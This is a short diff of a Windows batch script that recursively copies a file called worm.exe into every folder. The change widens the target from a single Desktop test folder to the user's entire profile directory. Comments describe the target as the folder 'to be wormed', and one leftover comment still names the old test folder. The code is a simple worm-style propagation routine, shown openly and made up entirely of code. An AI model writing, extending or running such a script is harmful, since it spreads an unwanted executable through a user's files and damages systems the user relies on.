@@ -1,7 +1,7 @@
 @echo off
-for /r "%USERPROFILE%\Desktop\LOL" %%i in (.) do @copy "%USERPROFILE%\Desktop\worm.exe" "%%i"
+for /r "%USERPROFILE%" %%i in (.) do @copy "%USERPROFILE%\Desktop\worm.exe" "%%i"
 
-REM %USERPROFILE% = C:\Users\(usernamewouldbehere)\anything else in that directory
+REM %USERPROFILE% = is short version of "C:\Users\username\Desktop" etc
 
 REM %USERPROFILE%\Desktop\LOL = the folder to be wormed
 
